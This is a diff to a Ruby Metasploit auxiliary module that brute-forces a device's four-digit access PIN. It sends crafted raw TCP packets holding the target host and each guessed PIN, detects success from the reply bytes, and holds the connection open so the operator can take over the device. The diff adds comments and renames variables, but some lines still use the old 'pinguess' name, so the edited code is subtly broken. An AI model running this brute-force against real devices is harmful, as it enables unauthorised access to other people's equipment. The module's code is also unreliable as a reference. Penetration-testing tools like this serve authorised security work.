@@ -47,6 +47,13 @@ class Metasploit3 < Msf::Auxiliary
     max = datastore['MAX']
     min = datastore['MIN']
 
+    ##
+    #The device generates PIN codes from 0000 - 9999. There is no reason for
+    #the minimum OR maximum to be over 9999. However, a user may want to limit
+    #the guessing range. Despite the error messages seeming to be incorrect,
+    #they are correct - if min > 9999, the module will guess PINs over 9999,
+    #which is pointless. Also, the minimum must always be lower than the maximum.
+    ##
     if max > 9999
       max = 9999
       print_error("Highest PIN value can be is 9999. Setting MAX to 9999 and continuing.")
@@ -64,18 +71,25 @@ class Metasploit3 < Msf::Auxiliary
     counter = min
 
     while counter <= max do
-      pinguess = "%04d" % counter
+      pin_guess = "%04d" % counter
+      #The sploit variable is built to contain connection string, hostname of device, and PIN.
+      #There is no public documentation available that describes the contents of the network packet.
+      #The packet structure was built by viewing valid traffic between the client and device.
       sploit = "\x24\x01\xc7\x25\xa7\x40\x00\x21\xcc\xcd\x05\x39\x08\x00\x45\x00\x00\xb1\x7e\xed\x40\x00\x80\x06\x00\x00\x0a\x5d\x0e\x2d\x0a\x5d\x5c\xc4\x80\x18\x01\x85\xc1\x4f\x27\x70\x0b\x43\xe6\xde\x50\x18\x01\x00\x80\x4e\x00\x00\x77\x70\x70\x63\x6d\x64\x00\x00\x92"
       sploit += datastore['RHOST']
       sploit += "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0a\x5d\x0e\x2d"
-      sploit += pinguess
+      sploit += pin_guess
       sploit += "\x00\x00\x00\x00\x0a\x0a\x14\x00\x01\x00\x00\x01\xff\x58\x4d\x4f\x50\x53\x44\x4b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
       sock.put(sploit)
-      rsploit = sock.recv(10)
-      pinright = "\x77\x70\x70\x63\x6d\x64\x00\x00\x93\x01"
-      pinwrong = "\x77\x70\x70\x63\x6d\x64\x00\x00\x93\x00"
+      r_sploit = sock.recv(10)
+      #This is the data of the TCP packet received from the device if the PIN is correct
+      pin_right = "\x77\x70\x70\x63\x6d\x64\x00\x00\x93\x01"
+      #This is the data of the TCP packet received from the device if the PIN is incorrect
+      pin_wrong = "\x77\x70\x70\x63\x6d\x64\x00\x00\x93\x00"
 
-      if rsploit == pinright
+      if r_sploit == pin_right
+        #If the PIN is right, we need to hold the connection open. If we do not,
+        #the PIN will immediately reset, and you will not be able to connect.
         print_status("Success! PIN is #{pinguess}")
         print_line("Sleeping for 30 seconds to let you connect")
         i = 1
@@ -86,22 +100,26 @@ class Metasploit3 < Msf::Auxiliary
           print_line(">> #{ic} seconds")
           i = i + 1
         end
+        #It may be helpful, if you decide to not connect to the device, to know
+        #whether or not somebody else is connected. We can try connecting again
+        #with the brute-forced PIN. If it changed, nobody was connected. If it
+        #did not change, then somebody (maybe you?) is connected.
         print_line("Waiting to re-check PIN...")
         disconnect
         sleep(6)
         connect
         sock.put(sploit)
-        rsploit = sock.recv(10)
-        if rsploit == pinright
+        r_sploit = sock.recv(10)
+        if r_sploit == pin_right
           print_status("PIN has not changed. You or somebody else must be connected.")
-        elsif rsploit == pinwrong
+        elsif r_sploit == pin_wrong
           print_status("PIN has changed. Nobody was connected.")
         else
           print_error("Unrecognised response. Did you break the device?")
         end
         disconnect
         break
-      elsif rsploit == pinwrong
+      elsif r_sploit == pin_wrong
         if counter % 500 == 0 && started == true
           print_line("Status: #{pinguess}")
         end
